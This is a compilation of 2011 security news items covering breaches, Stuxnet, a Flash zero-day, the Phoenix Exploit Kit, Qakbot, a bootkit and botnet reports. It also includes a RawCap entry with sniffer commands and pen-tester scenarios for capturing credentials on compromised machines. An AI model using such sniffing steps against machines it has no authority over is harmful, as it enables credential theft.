in, but it was already too late. On April 11, administrators discovered a server had been breached when data began leaving the network. Workers cleaned up the infected system, but early Friday evening “a number of other servers suddenly [went] active with the malware,” Zacharia said. The malware had apparently laid dormant for a week before it awoke on those systems. That’s when the lab blocked internet access. Zacharia said the malware “masked itself” on systems and was designed to erase itself if it tried to compromise a system and was unsuccessful. According to NetworkWorld, the attack was an attempt to steal data, although it is believed that no significant data has been lost thus far. The lab's director of communications is quoted in the article as stating that no one knows where the attacks originated. According to Knoxnews, the attack involved a zero-day exploit that took advantage of a vulnerability in Internet Explorer. The news comes only a month after the highly publicized APT attack on security vendor RSA, and is further proof that no group or company is immune to these attacks." }

German software developer Ashampoo has notified its customers about a data breach incident that resulted in the exposure of their names and email addresses. According to an announcement posted on the company's website, unidentified hackers broke through its security systems and gained unauthorized access to a server. \"We discovered the break-in and interrupted it instantly. The security gap through which the hackers gained access was closed immediately,\" said Ashampoo's CEO Rolf Hilchner. \"At the same time we reported this incident to the police. Further investigations are underway. Unfortunately, the traces of the well-concealed hackers currently disperse abroad,\" he added. Fortunately, the hackers did not obtain access to billing information as this data is not stored on the company's servers. In addition to its software development business, which includes anti-malware, firewall and data encryption products, the Ashampoo Group offers a diverse range of services through subsidiaries. Examples of these are DownloadMix, CleverReach, H&B Immobilien, CarShampoo or Ashampoo Air Services, but none of them were impacted by this incident. Ashampoo didn't disclose how many individuals were affected by the breach, but since the company claims to have has over 13.8 million customers, their number is probably very large. This incident is the latest in a series of security breaches that resulted in the theft of customer email lists from major companies. At the beginning of the month, Epsilon Data Management, one of the largest email marketing services provider in the world announced that its servers were compromised by hackers who walked away with the email addresses and names of tens or hundreds of millions of consumers. Ashampoo warns customers about targeted attacks that might result from this incident. It gives a recent example where hackers broke into the email systems of PurelyGadgets and sent fake confirmation orders in the company's name. The rogue emails distributed PDF documents rigged with an exploit. \"If you for example receive a confirmation of an order from PurelyGadgets or another company without having made an appropriate purchase there, please do not open the attachment and delete the e-mail immediately,\" Mr. Hilchner advises." }

Iran's state news agency, the Islamic Republic News Service (IRNA), quotes Brigadier General Gholam Reza Jalali as saying the German engineering giant played a part in the development of the world's most sophisticated malware. \"Siemens should explain why and how it provided the enemies with the information about the codes of the SCADA software and prepared the ground for a cyber attack against us,\" Jalali told IRNA. \"It was a hostile action which could have inflicted serious damage on the country if it had not been dealt with in a timely manner,\" he added. Jalali's remark might be a result of a The New York Times report that pointed at Israel and the US as likely Stuxnet creators and mentioned that Siemens worked in 2008 with the US Idaho National Laboratory (INL) to identify vulnerabilities in the company's SCADA software. \"The Foreign Ministry and other relevant political and judicial organizations should lodge complaints at international courts. The attacking countries should be held legally responsible for the cyberattack,\" the Iranian official stressed. Jalali, who heads Iran's Passive Defense Organisation, a military unit responsible for defending the country's nuclear facilities, reiterated that the malware was stopped in time before doing any considerable damage. He did, however, acknowledge that had it succeeded, the attack could have resulted in tragic accidents at industrial sites and refineries across the country. This conflicts with an earlier report from the Institute for Science and International Security (ISIS), which claims that up to 1,000 IR-1 uranium enrichment centrifuges were damaged by the malware. Retiring Mossad chief Meir Dagan also said that technical difficulties experienced by Iran delayed the creation of a bomb until 2015. Source" }

Data loss through cyber attacks decreased sharply in 2010, but the total number of breaches was higher than ever, according to the \" Verizon 2011 Data Breach Investigations Report .\" These findings continue to demonstrate that businesses and consumers must remain vigilant in implementing and maintaining security practices. The number of compromised records involved in data breaches investigated by Verizon and the U.S. Secret Service dropped from 144 million in 2009 to only 4 million in 2010, representing the lowest volume of data loss since the report's launch in 2008. Yet this year's report covers approximately 760 data breaches, the largest caseload to date. According to the report, the seeming contradiction between the low data loss and the high number of breaches likely stems from a significant decline in large-scale breaches, caused by a change in tactics by cybercriminals. They are engaging in small, opportunistic attacks rather than large-scale, difficult attacks and are using relatively unsophisticated methods to successfully penetrate organizations. For example, only 3 percent of breaches were considered unavoidable without extremely difficult or expensive corrective action. The report also found that outsiders are responsible for 92 percent of breaches, a significant increase from the 2010 findings. Although the percentage of insider attacks decreased significantly over the previous year (16 percent versus 49 percent), this is largely due to the huge increase in smaller external attacks. As a result, the total number of insider attacks actually remained relatively constant. Hacking (50 percent) and malware (49 percent) were the most prominent types of attack, with many of those attacks involving weak or stolen credentials and passwords. For the first time, physical attacks -- such as compromising ATMs -- appeared as one of the three most common ways to steal information, and constituted 29 percent of all cases investigated. For the second year in a row, the U.S. Secret Service collaborated with Verizon in preparing the report. In addition, the National High Tech Crime Unit of the Netherlands Policy Agency (KLPD) joined the team this year, allowing Verizon to provide more insight into cases originating in Europe. Approximately one-third of Verizon's cases originated in either Europe or the Asia-Pacific region, reflecting the global nature of data breaches.

Less than a week after warning that hackers were embedding malicious Flash Player files (.swf) into Microsoft Word documents to launch targeted malware attacks, Adobe plans to release an emergency Flash Player patch today to fix the underlying problem. The patch will fix a “critical” vulnerability in Flash Player 10.2.153.1 and earlier versions for Windows, Mac OS X Linux and Solaris. According to this Secunia advisory, the flaw allows a hacker to completely hijack a vulnerable Windows computer: A vulnerability has been reported in Adobe Flash Player, which can be exploited by malicious people to compromise a user’s system. The vulnerability is caused due to an error when parsing ActionScript that adds a custom function to the prototype of a predefined class. This results in incorrect interpretation of an object (i.e. object type confusion) when calling the custom function, which causes an invalid pointer to be dereferenced. Secunia has posted a technical analysis of the flaw as well. Adobe has confirmed that the vulnerability (CVE-2011-0611) could cause a crash and potentially allow an attacker to take control of the affected system. There are reports that this vulnerability is being exploited in the wild in targeted attacks via a malicious Web page or a Flash (.swf) file embedded in a Microsoft Word (.doc) or Microsoft Excel (.xls) file delivered as an email attachment, targeting the Windows platform. At this time, Adobe is not aware of any attacks via PDF targeting Adobe Reader and Acrobat. Adobe Reader X Protected Mode mitigations would prevent an exploit of this kind from executing. A patch for Google Chrome users is already available in Chrome version 10.0.648.205. Adobe plans to fix the vulnerability in Adobe Acrobat and Adobe Reader at a later date." }

The Phoenix Exploit Kit is a good example of exploit packs used to exploit vulnerable software on the computers of unsuspecting Internet users. Often, cybercriminals drive traffic to the exploit kit by compromising legitimate sites and by inserting iframes that point to the exploit kit or by poisoning search engine results that take users to the exploit kit. When users land on a page injected with the exploit kit, it detects the user’s Web browser and OS version then attempts to exploit either the browser or a browser plug-in. The latest version of the Phoenix Exploit Kit currently has payloads for nine different system configurations, including: * XPIE7: Internet Explorer 7 and either Windows XP, Windows XP SP2, or Windows 2003 * VISTAIE7: Internet Explorer 7 and Windows Vista * XPIE8: Internet Explorer 8 and either Windows XP, Windows XP SP2, or Windows 2003 * VISTAIE8: Internet Explorer 8 and Windows Vista * IE: Versions of Internet Explorer that are not IE7 or IE8 * WIN7IE: Internet Explorer and Windows 7 * XPOTHER: Browsers other than Internet Explorer on Windows XP, Windows XP SP2, or Windows 2003 * VISTAOTHER: Browsers other than Internet Explorer on Windows Vista * WIN7OTHER: Browsers other than Internet Explorer on Windows 7 Once users are directed to a payload page, the kit attempts to exploit vulnerabilities in versions of Adobe Acrobat Reader, Adobe Flash Player, Internet Explorer, and Java. Java has become the leading exploit vector for a variety of exploit packs. In fact, Phoenix Exploit Kit 2.5 has been updated to include three additional Java exploits, namely: * JAVA RMI * JAVA MIDI * JAVA SKYLINE The administration panel of Phoenix Exploit Kit 2.5 contains an option to switch modes, which changes the Java exploit delivered to users. It allows the administrator to choose from among TC (CVE-2010-0840), RMI, or MIDI. This indicates that exploits for Java have become very attractive to malware distributors.

Here are some highlights of why RawCap is a great tool to have in your toolset: Can sniff any interface that has got an IP address, including 127.0.0.1 (localhost/loopback) RawCap.exe is just 17 kB No external libraries or DLL's needed No installation required, just download RawCap.exe and sniff Can sniff most interface types, including WiFi and PPP interfaces Minimal memory and CPU load Reliable and simple to use Usage RawCap takes two arguments; the first argument is the IP address or interface number to sniff from, the second is the path/file to write the captured packets to. C:\\Tools>RawCap.exe 192.168.0.23 dumpfile.pcap You can also start RawCap without any arguments, which will leave you with an interactive dialog where you can select NIC and filename: C:\\Tools>RawCap.exe Network interfaces: 0. 192.168.0.23 Local Area Connection 1. 192.168.0.47 Wireless Network Connection 2. 90.130.211.54 3G UMTS Internet 3. 192.168.111.1 VMware Network Adapter VMnet1 4. 192.168.222.1 VMware Network Adapter VMnet2 5. 127.0.0.1 Loopback Pseudo-Interface Select network interface to sniff [default '0']: 1 Output path or filename [default 'dumpfile.pcap']: Sniffing IP : 192.168.0.47 File : dumpfile.pcap Packets : 1337 For Incident Responders RawCap comes in very handy for incident responders who want to be able to sniff network traffic locally at the clients of the corporate network. Here are a few examples of how RawCap can be used for incident response: A company laptop somewhere on the corporate network is believed to exfiltrate sensitive coporate information to a foreign server on the Internet by using a UMTS 3G connection on a USB dongle. After finding the internal IP address on the corporate network the Incident Response Team (IRT) use the Sysinternals tool PsExec to inject RawCap.exe onto the laptop and sniff the packets being exfiltrated through the 3G connection. The generated pcap file can be used to determine what the external 3G connection was used for. A computer is suspected to be infected with malware that uses an SSL tunnelling proxy (stunnel) to encrypt all Command-and-Control (C&C) communication. The data that is to be sent into the tunnel is first sent unencrypted to localhost (127.0.0.1 aka loopback interface) before it enters the encrypted tunnel. Incident responders can use RawCap to sniff the traffic to/from localhost on the Windows OS, which is something other sniffing tools cannot do. A corporate laptop connected to the companies WPA2 encrypted WiFi is found to have suspicious TCP sessions opened to other computers on the same WiFi network. Incident responders can run RawCap locally on any of those machines in order to capture the WiFi network traffic to/from that machine in unencrypted form. For Penetration Testers RawCap was not designed for pen-testers, but I realize that there are some situations where the tool can come in hany when doing a penetration test. Here are some examples: After getting remote access and admin privileges on a Windows XP machine the pen-tester wanna sniff the network traffic of the machine in order to get hold of additional credentials. Sniffing tools like dumpcap, WinDump and NMCap can unfortunately not be used since no WinPcap or NDIS driver is installed. RawCap does, however, not need any special driver installed since it makes use of the Raw Sockets functionality built into Windows. Pen-testers can therefore run RawCap.exe to sniff traffic without installing any drivers. After getting admin on a box the pen-tester wanna sniff the network traffic, but box uses a WiFi network so traditional sniffing tools won't work. This is when RawCap comes in handy, since it can sniff the WiFi traffic of the owned machine just as easily as if it had been an Ethernet NIC. Download RawCap RawCap Downloaded" }

In a warning letter sent last month to about 300 employees, contractors, and a handful of customers, the company said it discovered the infection in late February. Several servers were hit, including Citrix servers used by employees for remote access to IT systems. A copy of The Hartford's letter was posted earlier this week to the website of the Office of the New Hampshire Attorney General : http://doj.nh.gov/consumer/pdf/hartford2.pdf \"It was a very small incident,\" said Debora Raymond, a company spokeswoman. The victims were mostly company employees. Less than 10 customers were affected by the malware, the W32-Qakbot Trojan, she said. Qakbot has been around for about two years. Once installed it spreads from computer to computer in the network, taking steps to cover its tracks as it logs sensitive data and opens up back doors for the hackers to access the network. With 28,000 employees worldwide, the 200-year-old Hartford, Connecticut, firm is one of the country's largest insurance companies. The Hartford's letters are going out to \"users who logged onto an infected server (either through a Citrix session or support purposes)\" between Feb. 22 and Feb. 28, 2011, The Hartford said in its letter. \"We do know that the virus has the potential to capture confidential data such as bank account numbers, Social Security numbers, user accounts/logins, passwords, and credit card numbers,\" the letter states. It's not clear how The Hartford was infected, but hackers have been targeting staffers for years now -- particularly those in IT -- with targeted e-mail attacks, trying to trick them into visiting malicious websites or downloading Trojan horse programs. Security experts say that these attacks are widespread and often methodically planned. Despite the presence of keylogging software, the insurance company's lawyer, Debra Hampson, said that her company has \"no reason to believe that any information has been or will be misused.\" Victims are being given two years' free credit monitoring. Working with its antivirus vendor, The Hartford has cleaned up the infected servers and is working on locking down its systems. One of the steps, Hampson said: \"Providing additional privacy and information security training for employees in order to warn them of the dangers of downloading files from unknown sources on the Internet.\" Source : http://www.pcworld.com/" }

The bootkit is installed on the computer by a trojan downloader distributed from a Chinese adult site and is detected by Kaspersky as Rookit.Win32.Fisp.a. Once executed, the rootkit makes a copy of the old MBR and replaces the sectors with its own code which includes an encrypted driver. When the computer boots, the malicious code executes and restores the original MBR so that Windows can load normally. It then uses hooks to replace the fips.sys system driver with a malicious one. \"It should be noted that the driver fips.sys is not required for the operating system to run correctly, so the system won’t crash when it is replaced,\" says Kaspersky Lab expert Vyacheslav Zakorzhevsky. The driver scans loaded processes to determine if they belong to one of over a dozen antivirus programs and prevent them from running properly. The targeted security products include many Chinese ones from Beike, Rising, 360, Kingsoft, Keniu Network Technology, Beijing Jiangmin or Qizhi Software, but also internationally recognized vendors like AVG, BitDefender, Symantec, Kaspersky and ESET. The rootkit serves as a malware distribution platform. It hooks the explorer.exe process and injects a downloader component that communicates with a remote server. This component has been seen downloading variants of Trojan-Dropper.Win32.Vedio.dgs and a game password stealer detected by Kaspersky as Trojan-GameThief.Win32.OnLineGames.boas. Online gaming is hugely popular in China and there is a large underground market for stolen virtual goods, currency, accounts, items and so on. MBR rootkits are notoriously hard to remove because they can control the system before antivirus programs start.

The hack last month at RSA Security has been shrouded in mystery. How did a hacker manage to infiltrate one of the world’s top computer-security companies? And could the data that was stolen be used to impair its SecurID products, which are used by 40 million businesses that are trying to keep their own networks safe from intruders? The division of the EMC Corporation is staying mum about what exactly was stolen from its computer systems, aside from that is was data related to SecurID. But on Friday RSA shed some light on the nature of the attack. In a blog post titled “Anatomy of an Attack,” the company’s head of new technologies, Uri Rivner, described a three-stage operation that was similar to several other recent prominent attacks on technology companies, including a 2009 attack on Google that it said originated in China. In the attack on RSA, the attacker sent “phishing” e-mails with the subject line “2011 Recruitment Plan” to two small groups of employees over the course of two days. Unfortunately, one was interested enough to retrieve one of these messages from his or her junk mail and open the attached Excel file. The spreadsheet contained malware that used a previously unknown, or “zero-day,” flaw in Adobe’s Flash software to install a backdoor. RSA said that Adobe had since released a patch to fix that hole. After installing a stealthy tool that allowed the hacker to control the machine from afar, he stole several account passwords belonging to the employee and used them to gain entry into other systems, where he could gain access to other employees with access to sensitive data, Mr. Rivner said. Then came stage three: spiriting RSA files out of the company to a hacked machine at a hosting provider, and then on to the hacker himself. The attacker left few traces. But an unclassified document from the United States Computer Emergency Readiness Team (US-CERT) obtained by the blogger Brian Krebs revealed three Web addresses used in the intrusion, one of which includes the letters “PRC,” which could refer to the People’s Republic of China — or it could be a ruse. According to Mr. Rivner, it’s difficult for companies with the world’s most sophisticated defenses to stop this newfangled “advanced persistent threats,” which are made potent by the combination of low-tech “social-engineering” cons and a high-tech zero-day attack that antivirus software won’t recognize. That RSA detected the attack in progress was a victory, he argued. Many other companies hit by similar attacks “either detected the attacks after months, or didn’t detect them at all and learned about it from the government,” he said. “As an industry, we have to act fast and develop a new defense doctrine; the happy days of good old hacking are gone, and gone too are the old defense paradigms.” But some security experts ridiculed the notion that the attack was sophisticated. Jeremiah Grossman, founder of WhiteHat Security, posted on Twitter: “I can’t tell if this RSA APT blog post is actually being serious or an April 1st gag. The content is absurd either way.” News Source : http://bits.blogs.nytimes.com" }

In the past the tabs which could be added to these pages have been set up in two ways; the first used the Facebook FBML app. This allowed page tabs to be created using static Facebook Markup Language (FBML) or HTML, it wasn’t particularly engaging but it was very simple to use. The second method for creating page tabs was by adding a custom Facebook app inside a standard FBML tab. This meant the custom app could request external data from a third party and display it inside the page tab. This content though was subject to many technical limitations, as it was all proxied through Facebook which broke many things including tracking pixels, JavaScript and Flash. So what is the big change? Well Facebook now allow iframes to be included inside Facebook apps on page tabs, meaning that all that Facebook proxying can be avoided. While this is no doubt great news for legitimate developers it will undoubtedly make life for those with malicious intent much easier too. It is now possible to set up a Facebook page, create a default landing tab (the one you first see when you visit the page) and include an app that contains an iframe. That iframe can for example contain JavaScript which immediately and without user interaction redirects you to any site it chooses. Say for example a page containing Fake AV or a page where an exploit kit is waiting to silently infect you with malware. No more likejacking required, no more having to persuade users to install your app, if a criminal can make the bait sweet enough just to get you to visit the page, that is all they will require to start the chain that leads to your computer being compromised and used for criminal purposes. Of course Facebook ask their developers to agree to a code of conduct that prohibits such activities, but when it comes to criminals, that’s a bit like taking a driving license away from a joyrider. I have informed Facebook of this oversight in their new functionality and will update this blog posting if I hear back from them.

RIM said hackers can steal data from users' memory cards on some BlackBerry devices. They can also install malware by exploiting the hole, but the company said that even if attacked, the phone's emails and contacts would be safe. The publicity is particularly bad for the company who stakes its reputation on the security and privacy of its service. RIM, which has been forced to use more third-party software to compete with the flashy features of other platforms, provides more targets to hack. The vulnerability was discovered at the \"Pwn2Own\" hacking contest last week. Although the contest winners were not allowed to publicize specifics of the vulnerabilities until companies have patched them, it's possible that malware authors are already aware of it. An iPhone 4 was also hacked during the contest. The contest could actually help RIM, though, if it drives focus on security. According to the coders who discovered the flaw, RIM's smartphone software doesn't make use of some important security techniques, and the company is heavily reliant on \"security by obscurity,\" the fallible strategy of hiding how software works to keep hackers at bay." }

Users were strongly advised to change their passwords on any site they accessed using the same login credentials as they used with InterWorx.

From Creeper to Stuxnet, the last four decades saw the number of malware instances boom from 1,300 in 1990, to 50,000 in 2000, to over 200 million in 2010. Besides sheer quantity, viruses, which were originally used as academic proof of concepts, quickly turned into geek pranks, then evolved into cybercriminal tools. By 2005, the virus scene had been monetized, and virtually all viruses were developed with the sole purpose of making money via more or less complex business models. In the following story, FortiGuard Labs looks at the most significant computer viruses over the last 40 years and explains their historical significance. 1971: Creeper: catch me if you can While theories on self-replicating automatas were developed by genius mathematician Von Neumann in the early 50s, the first real computer virus was released “in lab” in 1971 by an employee of a company working on building ARPANET, the Internet’s ancestor. Intriguing feature: Creeper looks for a machine on the network, transfers to it, displays the message “I’m the creeper, catch me if you can!” and starts over, thereby hoping from system to system. It was a pure proof of concept that ties the roots of computer viruses to those of the Internet. 1982: Elk Cloner Written by a 15-year old as a way to booby trap his friends’ Apple II computer systems without physical access to them, Elk Cloner spread via floppy disks. Infected machines displayed a harmless poem, dedicated to the virus’ glory. Intriguing feature: Elk Cloner was the first virus ever to spread outside of the lab it was created in. Its global impact was negligible and its intent plainly geeky. 1987: Jerusalem First detected in the Hebrew University of Jerusalem, the aptly-named Jerusalem is somewhat deleterious. Each year on Friday the 13th, this virus deleted every single program that’s run on the infected system. Intriguing feature: Jerusalem is the first example of a destructive virus to have a global impact. Of course, the sheer number of computers back then was infinitesimal, compared to today. 1992: Michelangelo: The sleeper must awaken The dormant Michelangelo virus was designed to awaken on March 6th (Michelangelo’s birthday – as in the Renaissance artist, not the Ninja Turtle) and erase critical parts of infected computers’ hard drives. Intriguing feature: The promises of destruction it carried spawned a media frenzy. In the weeks preceding March 6th, media relayed (and some may say amplified) experts’ predictions forecasting 5 million computers going definitively down. Yet, on March 6th, only a few thousand data losses were reported – and public trust in AV companies’ ethics was tainted for a while. 1999: Melissa Melissa propagated via infected Microsoft Word documents and mailed itself to Outlook contacts of the contaminated user. It was virulent enough to paralyze some important mailing systems on the Internet. Its author created the bug to honor Melissa, a stripper he’d met in Florida. Whether he conquered her heart this way is somewhat unlikely, but one thing is sure: the malicious code earned him 20 months in jail and a $5,000 fine. Intriguing feature: Someone created a variant of Melissa that encrypted the infected files and demanded a ransom of $100 to be wired to an offshore account for decryption. The author was traced to the said account. While it remained an isolated case, it is worth noting that 6 years before the malware scene became fully monetized, someone had already started figuring out how to make bucks out of viruses. 2000: I LOVE YOU At the dawn of the XXIst century, I LOVE YOU worm infected tens of millions of computers. As a fairly simple worm, I LOVE YOU presented itself as an incoming email with “I love you” in its subject line and infected the machine of users who opened the attachment. It then mailed itself to all of the contacts found on the infected user’s system. Intriguing feature: While the author’s motivation clearly wasn’t about money, the damages were: When the dust settled, I LOVE YOU had cost companies around the world between $5 and $10 billion. Much of that cost can be attributed to the time spent “cleaning” infected machines. 2001: Code Red While I LOVE YOU targeted end users, Code Red infected Web servers, where it automatically spread by exploiting a vulnerability in Microsoft IIS servers. In less than one week, nearly 400,000 servers were infected, and the homepage of their hosted Websites was replaced with “Hacked By Chinese!” Intriguing feature: Code Red had a distinguishing feature designed to flood the White House Website with traffic (from the infected servers), probably making it the first case of documented ‘hacktivism’ on a large scale. 2004: Sasser Like Code Red, Sasser spread without anyone’s help; but this time, the virus exploited a vulnerability in Microsoft Windows to propagate, which made it particularly virulent. What’s more, due to a bug in the worm’s code, infected systems turned off every couple of minutes. Intriguing feature: For the first time, systems whose function isn’t normally related to the Internet (and that mostly existed before the Internet) were severely impacted. More than one million systems were infected, AFP’s communications satellites were interrupted for hours, Delta Airlines was forced to cancel flights, the British coast guard had to go back to print maps, and a hospital had to redirect its emergency room because its radiology department was completely paralyzed by the virus. The damage amount was estimated to be more than $18 billion. Microsoft placed a $250,000 bounty on the author’s head, who turned out to be an 18-year old German student. When caught, the student admitted that he created the malicious code as a creative way to help his mother to find a job in the computer security industry. 2005: MyTob, the turning point MyTob appeared in 2005 and was one of first worms to combine the features of a Bot (the infamous “Zombies,” controlled by a remote Botmaster) and a mass-mailer. Intriguing feature: MyTob marks the entry in the era of Botnets and of cybercrime. Business models designed to “monetize” the many botnets appeared (some of which will count more than 20 million machines): installation of spyware, diffusion of spam, illegal content hosting, interception of banking credentials, blackmail, etc. The revenue generated from these new botnets quickly reached several billion dollars per year; a figure that is growing today. 2007: Storm botnet By 2007, cybercriminals already had lucrative business models in place. They’re thinking about protecting their money spinners (infected computers). Before 2007, botnets showed a cruel lack of robustness: in neutralizing its unique Control Center, a botnet could be completely neutralized, because Zombies didn’t have anyone to report to (and take commands from) anymore. Intriguing feature: By implementing a peer-to-peer architecture, Storm became the first Botnet with decentralized command… It is much more robust. At the peak of the epidemic, Storm had infected between 1 and 50 million systems and accounted for 8% of all malware running in the world. 2008: Koobface Koobface (an anagram for Facebook) spreads by pretending to be the infected user on social networks, prompting friends to download an update to their Flash player in order to view a video. The update is a copy of the virus. Intriguing feature: Koobface is the first botnet to recruit its Zombie computers across multiple social networks (Facebook, MySpace, hi5, Bebo, Friendster, etc). Today, it is estimated that at any time, over 500,000 Koobface zombies are online at the same time. 2009: Conficker Conficker is a particularly sophisticated virus, as it’s both a worm, much like Sasser, and an ultra-resilient botnet, which implements bleeding-edge defensive techniques. Curiously, it seems that its propagation algorithm is poorly calibrated, causing it to be discovered more frequently. Some networks were so saturated by Conficker, that it caused planes to be grounded, including a number of French Fighter planes. In addition, hospitals and military bases were impacted. In total approximately 7 million systems were infected worldwide. Intriguing feature: Conficker did not infect Ukrainian IPs, nor machines configured with a Ukrainian keyboard. This suggests the authors were playing by the cybercriminal gold rule, which implicitly states, “Don’t target anything in your own country, and the arm of justice won’t be long enough to reach you.” 2010: Stuxnet, welcome to the cyber war According to most threat researchers today, only governments have the necessary resources to design and implement a virus of such complexity. To spread, Stuxnet exploited several critical vulnerabilities in Windows, which, until then, were unknown, including one guaranteeing its execution when inserting an infected USB key into the target system, even if a systems autorun capabilities were disabled. From the infected system, Stuxnet was then able to spread into an internal network, until it reached its target: a management system of an industrial process edited by Siemens. In this particular instance, Stuxnet knew the weak point with a specific controller – perhaps a cooling system – and most likely intended to destroy or neutralize the industrial system. Intriguing feature: For the first time, the target of a virus is the destruction of an industrial system (very probably a nuclear power plant in Iran). What’s next? According to the trends we’re seeing, the next target for cybercriminals could be smart phones. Their widespread use and the fact that they incorporate a payment system (premium rate phone numbers) make them easy money-generating targets. Furthermore, they have a localization system, a microphone, embedded GPS and one (or several) cameras, which potentially allow a particularly invasive spying of their owners.

And there is evidently a shortage of such personnel in the current cyber defense workforce. The United States alone needs between 10,000 to 30,000 well-trained personnel who have specialized skills required to effectively guard its national assets. In essence, there is a huge shortage of highly technically skilled information security professionals. The problem is both of quantity, and quality, and this is not a problem just for the government space. Public and private companies are also in dire straits trying to fill such staffing needs. The information security workforce requires not just technically proficient people to operate and support existing systems that are already deployed. There is a great demand for highly skilled professionals who can design security systems, application engineers who can write secure codes, as well as forensics experts who are well trained with highly advanced computer examination skills. Threats to SCADA and Critical Infrastructures are mounting and nations cannot ignore that these threats needs effective methods and manpower to be mitigated, should it ever occur. With the exponential growth of mobile devices adoption, and higher dependency on wireless communications, hackers are finding more ways and means to exploit these technology, and crippling organization and agencies alike. One of the keys to address these issues will be to be adequately train and equip cyber defenders with cutting edge technological skills that are required to prevent such attacks and build a sound perimeter defense to deter these threats. A company needs to ensure that its current cyber workforce is well-trained, and as an individual, one needs to maintain technical proficiencies that are up-to-date in order to stay employable. Without a doubt, training is essential. Recognizing this gap, EC-Council has launched the Center of Advanced Security Training (CAST), to address the deficiency in the lack of highly technically skilled information security professionals. CAST will provide advanced and specialized information security training for specific domains such as application security, penetration testing, computer forensics, social engineering, malware and botnet analysis, among others. These highly technical training programs are designed with industry practitioners to ensure that content are current and relevant, and the focus of CAST training will be its thorough extensive hands-on approach, to enable participants to combat real life scenarios. \"Certification has grown to become a necessity. It is critical for information security professionals to be equipped with the baseline knowledge and skills that any certification provides,\" said Jay Bavisi, president of EC-Council. He adds, \"However, it is the advanced skills and technical proficiency that will make one stand out from its peers. Such skills can only be acquired through specialized and highly technical training. And these are the components that CAST aims to provide to the infosec professional community.\" Some of first CAST programs that will be rolled out are Advanced Penetration Testing course by Joseph McCray, an air force veteran who has tested over 150,000 machines in his career alone, and the Digital Mobile Forensics Deep Dive, by Wayne Burke, former cyber crime investigator with the South African police department. There is also the Advanced Application Security course by Tim Pierson, the well-traveled information security consultant and trainer, who had co-authored a book on Virtualization security. CAST training will be available at all EC-Council hosted conferences and events, and through specially selected training partners. The launch classes for CAST will be at the upcoming TakeDownCon Dallas, from May 15-17, 2011.

Botnets, such as the one that uses the infamous Zeus malware to infect machines, are growing in scope and scale, and ENISA has released two reports in which it attempts to understand the root of the problem and how to tackle it. The security agency warned that combating botnet attacks will take a co-ordinated response and should only be tackled after careful consideration of their impact and motivation. \"The botnet numbers define the political agenda and they determine hundreds of millions of euros of security investments. We should understand what is behind them,\" said Giles Hogben, the report editor. \"Size is not everything - the number of infected machines alone is an inappropriate measure of the threat.\" ENISA's main report, Botnets: Measurement, Detection, Disinfection and Defence (PDF) is an investigation into how best to measure the size of botnets and their threats, and more importantly how to neutralise them. Here, collaboration, specifically between nation states and their security mechanisms, is of considerable importance. \"Global co-operation is indispensable for successful defence against botnets,\" added Udo Helmbrecht, the executive director of ENISA. The report suggests that botnets should be tackled on a co-ordinated basis, as sharing information about attacks will increase understanding and limit any further infection. Enisa also suggested that laws should be harmonised as a way of ensuring a consistent approach by regulators. Service providers should have a role to play too, in taking more responsibility for spotting suspicious activity on their networks. ISPs should be \"strongly incentivised\" to improve monitoring and malware takedowns, according to the report. End users were also the focus of some attention and they will be expected to do all they can to stop their machines getting infected with botnet malware. ENISA wants to support this increased security push with educational or support programmes designed to raise awareness about personal protection. A second report, titled Botnets: 10 Tough Questions, is a \"distillation\" of the body's discussions with experts including ISPs, security researchers, computer emergency response teams, anti-virus firms and law enforcement agencies. It raises questions such as what kind of legislation is needed and where money should be invested. A third report, scheduled for release later this year, will deal with the legislative environment surrounding such attacks." }

Trojan-based attacks continue to be the biggest malware threat in February, but PDF exploits aren’t far behind, according to several security reports. About 1 in 290 e-mails in February were malicious, making the month one of the most prolific periods for the threats, according to Symantec’s February 2011 MessageLabs Intelligence Report. The global ratio of spam in e-mail traffic was 81.3 percent, an increase of 2.7 percent since January, the report found. The recent decline in spam appears to have reversed for the time being, according to the report. There was a lot of botnet activity in February, and the perpetrators appeared to be working together to some extent to distribute Trojans, according to Symantec. There were signs of integration across Zeus, Bredolab and SpyEye, as techniques associated with one malware family were being used by others, Symantec said in the report. The attacks were well-timed and used carefully targeted techniques, suggesting a “common origin” for these infected messages. One day, the messages would be propagating mainly Zeus variants, followed by a day dedicated to distributing SpyEye variants and later with Bredolab, in an alternating pattern, according to Paul Wood, MessageLabs Intelligence senior analyst. By the middle of the month, the variants propagated simultaneously with an advanced package that evaded traditional antivirus detection, he said. All the attacks used a .ZIP archive attachment containing malicious code. About 1.5 percent of blocked malware had malicious .ZIP attachments, and 79.2 percent of those files were connected to the Bredolab, Zeus and SpyEye attacks, researchers said. Contrary to recent belief, Bredolab is not dead, as MessageLabs identified at least 40 variants of malware associated with Bredolab in February, accounting for at least 10 percent of e-mail-borne malware blocked by MessageLabs Intelligence that month. SpyEye also appeared on FortiNet’s Threat Landscape report for the first time, signaling new activity and techniques. “We’re likely to see similar ongoing activity by the SpyEye group, such as routine obfuscation of their data and command and control transmissions,” said Derek Manky, senior security strategist at Fortinet. “SpyEye developers are also working to make their product more efficient in terms of management and automation, which is evidenced by the bot’s new Automatic Transfer System.” Both GFI Software and Symantec researchers said Trojans were the main threat in February but that PDF exploits are on the rise. Trojans accounted for six of the top 10 malware threats of February, according to GFI Software’s monthly report. Malicious PDF files now account for a larger proportion of document types used in attacks, according to Symantec. Based on current trends, Symantec predicted 76 percent of targeted malware could be used for PDF-based attacks by mid-2011. “PDF-based targeted attacks are here to stay and are predicted to worsen as malware authors continue to innovate in the delivery, construction and obfuscation of the techniques necessary for this type of malware,” Wood said. China was the most spammed country in February, followed by the United States, Canada and the United Kingdom. Spam levels were 81.4 percent for the United States, compared with China's 86.2 percent. The most spammed industry sector continued to be the automotive sector, with 84.3 percent of e-mail, followed by education and pharmaceuticals. However, governmental organizations were the most targeted for malware, with 1 in 41.1 e-mails being blocked as malicious, according to Symantec. While virus activity increased slightly, the volume of e-mails with links to malicious Websites declined from January, Symantec said. Of the malicious domains blocked in February by MessageLabs Intelligence, 38.9 percent were new, a decline of about 2 percent since January, Symantec said. An average of 4,098 new Websites harboring malware was identified per day, a decrease of almost 14 percent since January, according to the report. Despite more malware flooding networks, actual infection rates may be dropping, Panda Security researchers said. The security firm based its results on data gathered by Panda ActiveScan, a free online scanner available on the company’s Website. Of the computers scanned in February, only 39 percent were infected with malware, compared with 50 percent in January, Panda Security said. Of the infected computers, Trojans were the most common malware found; they are responsible for 61 percent of infections." }

